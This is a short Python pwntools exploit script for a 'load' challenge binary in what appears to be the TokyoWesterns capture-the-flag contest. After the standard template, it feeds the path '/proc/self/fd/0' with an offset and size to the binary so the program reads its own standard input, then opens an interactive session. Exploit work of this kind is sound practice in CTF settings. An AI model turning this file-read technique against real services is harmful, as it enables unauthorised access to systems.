#!/usr/bin/env python2
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF('load')

host = args.HOST or 'pwn1.chal.ctf.westerns.tokyo'
port = int(args.PORT or 34835)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

gdbscript = '''
continue
'''.format(**locals())

# -- Exploit goes here --


context.terminal = ['gnome-terminal', '-e']
io = start()

filename = '/proc/self/fd/0'
offset = 0
size = 100

log.info(filename)
log.info(hex(offset))
log.info(hex(size))

io.sendlineafter(':', filename)
io.sendlineafter(':', str(offset))
io.sendlineafter(':', str(size))

io.interactive()

